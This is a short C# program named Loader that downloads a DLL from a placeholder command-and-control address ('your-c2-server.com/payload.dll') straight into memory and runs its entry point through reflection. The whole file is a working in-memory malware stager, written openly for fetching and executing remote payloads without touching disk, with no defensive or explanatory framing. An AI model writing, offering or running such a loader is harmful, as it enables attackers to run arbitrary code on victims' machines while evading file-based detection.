using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

public class Loader
{
    public static void Main()
    {
        // URL of the payload to download and execute
        string url = "http://your-c2-server.com/payload.dll";

        // Download the payload into memory
        WebClient client = new WebClient();
        byte[] payload = client.DownloadData(url);

        // Load the assembly from the byte array
        Assembly assembly = Assembly.Load(payload);

        // Find the entry point and invoke it
        MethodInfo entryPoint = assembly.EntryPoint;
        entryPoint.Invoke(null, null);
    }
}
